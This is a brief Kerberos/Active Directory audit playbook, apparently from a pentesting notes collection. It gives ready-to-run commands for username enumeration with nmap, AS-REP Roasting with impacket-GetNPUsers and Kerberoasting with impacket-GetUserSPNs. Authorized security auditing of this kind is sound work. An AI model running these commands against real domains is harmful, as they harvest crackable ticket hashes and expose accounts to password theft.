---
type: Audit Playbook
title: Kerberos audit playbook
description: Tools and steps for auditing a Kerberos service (Active Directory).
tags: [kerberos, active-directory, port-88]
timestamp: 2026-07-20T00:00:00Z
---

Port: 88.

# Tools used

[nmap](../tools/nmap.md) NSE scripts, impacket-GetNPUsers, impacket-GetUserSPNs.

# Steps

1. `nmap -Pn <target> --script krb5-enum-users` to enumerate valid usernames.
2. `impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass` for AS-REP Roasting (no credentials needed).
3. If credentials are available: `impacket-GetUserSPNs <domain>/<user>:<pass> -request` for Kerberoasting.
